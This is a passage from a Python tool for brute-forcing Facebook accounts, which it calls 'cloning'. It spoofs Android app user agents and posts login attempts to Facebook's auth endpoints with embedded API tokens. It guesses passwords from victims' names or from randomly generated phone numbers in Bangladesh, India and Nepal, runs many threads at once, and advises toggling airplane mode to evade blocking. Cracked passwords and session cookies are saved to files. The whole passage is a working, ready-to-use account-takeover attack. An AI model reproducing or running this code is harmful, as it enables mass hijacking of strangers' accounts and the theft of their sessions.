    rocky8=f'Dalvik/2.1.0 (Linux; U; Android 5; A5s Build/LJW4R9) [FBAN/FBIOS;FBAV/'+str(cho)+'.0.0.27.106;FBBV/'+str(vir)+';FBRV/0;FBPN/'+str(platform)+';FBLC/bn_IN;FBMF/Nokia;FBBD/Nokia;FBDV/C21 Plus;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height= '+str(pkg)+'};'+f'FB_FW/1;]'
    rocky9=f'Dalvik/2.1.0 (Linux; U; Android 8; GREEN 2020 Build/OPM1.515294.038) [FBAN/FB4A;FBAV/'+str(cho)+'.0.0.20.109;FBBV/'+str(vir)+';FBDM/'+'{density='+str(dens)+',width='+str(width)+',height='+str(pkg)+'};'+f'FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/'+str(platform)+';FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    rocky10=f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/'+str(cho)+'.0.0.17.116;FBPN/'+str(platform)+';FBLC/th_TH;FBBV/'+str(vir)+';FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/'+str(oppo)+';FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density='+str(dens)+',width='+str(width)+',height='+str(pkg)+'};FB_FW/1;] FBBK/1'
    rocky11=f'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/'+str(cho)+'.0.0.16.158;FBPN/'+str(platform)+';FBLC/en_US;FBBV/'+str(vir)+';FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/'+str(vivo)+';FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density='+str(dens)+',width='+str(width)+',height='+str(pkg)+'}' 
    rocky12=f'[FBAN/FB4A;FBAV/'+str(cho)+'.0.0.47.119;FBBV/'+str(vir)+';FBDM{density='+str(dens)+',width='+str(width)+',height='+str(pkg)+'};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/'+str(platform)+';FBDV/'+str(sum)+';FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return random.choice([rocky1,rocky2,rocky3,rocky4,rocky5,rocky6,rocky7,rocky8,rocky9,rocky10,rocky11,rocky12])

#──────────────{ FILE-METHOD-M2 }──────────────#
def __file_M2__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {'User-Agent': randBuildLSB(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'b-graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)                
                open('/sdcard/ROCKY-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M3 }──────────────#

def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": randBuildLSB(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ROCKY-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M4 }──────────────#
def __file_M4__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ROCKY-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M5 }──────────────#
def __file_M5__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ROCKY-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M6 }──────────────#
def __file_M6__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ROCKY-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M7 }──────────────#
def __file_M7__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ROCKY-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M8 }──────────────#
def __file_M8__(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\r{A}|ROCKY-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Ahmed'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			ROCKYxd=session.cookies.get_dict().keys()
			if "c_user" in ROCKYxd:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
				print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
				open('/sdcard/ROCKY-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ROCKYxd:
				print(f'\r\r{R}|R 4 G_CP| '+ids+' | '+pas)
				open('/sdcard/ROCKY-M8-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#──────────────{ RANDOM }──────────────#
def __Randmx__():
	clear()
	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");print(f"{A}|3| NEPAL CLONING");print(f"{A}|4| PAKISTAN CLONING");print(f"{A}|5| AFGHANISTAN CLONING");linex();option = input(f'{A}|?| CHOICE : ')
	if option in ['A','1']:__bdx__()
	elif option in ['B','2']:__india__()
	elif option in ['C','3']:__nepalx__()
	elif option in ['D','4']:__pakistan__()
	elif option in ['E','5']:__afghanistanx__()
	else:
		print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __bdx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 / 018');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=60) as ROCKYx:
        clear()
        tl=str(len(user))
        print(f'{A}(=) RANDOM UID : {tl} ');print(f'{A}(=) SIM CODE   : {code} ');print(f"{A}(=) USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'bangladesh','506070','405060','102030','freefire','i love you','mahedi','708090','@@@###','@#@#@#','adiya','sadiya','jannat','alisha','asha112','raisha123','ahmad@@','freefire@@','123456','FreeFire','Pubg123','TikTok','Bangladesh','sadiya','mahbuba','mahbub','ayesha','sumaiya','tamanna','kadija','sultana','sanjida']
            if methodx in ['1']:ROCKYx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:ROCKYx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:ROCKYx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:ROCKYx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:ROCKYx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +91639 / +98282 / +92627 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as ROCKYx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if methodx in ['1']:ROCKYx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:ROCKYx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:ROCKYx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:ROCKYx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:ROCKYx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-NEPAL }──────────────#
def __nepalx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 9815 / 9840 / 9814 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
